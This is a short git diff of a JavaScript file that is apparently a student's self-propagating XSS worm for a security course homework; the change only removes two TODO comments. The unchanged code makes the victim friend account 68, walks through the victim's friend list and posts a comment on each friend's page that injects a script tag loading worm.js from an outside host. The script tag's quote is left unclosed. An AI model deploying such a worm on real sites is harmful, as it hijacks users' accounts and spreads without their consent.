@@ -1,7 +1,6 @@
 // One wormy boi for CSEC-380 hmwk6
 
 // Get the user to friend me
-// TODO:
 $.get("add_friend.php", {'id': 68})
 
 // Loop through their friends and post worm on their pages
@@ -18,7 +17,6 @@ $.get("friends.php", function(friends){
 });
 
 // Function to post worm on a person's page
-// TODO:
 function spread(id){
     $.get("add_comment.php", {'id': id, 'comment': "<script src='http://nutsplash.zone/worm.js></script>"})
 }
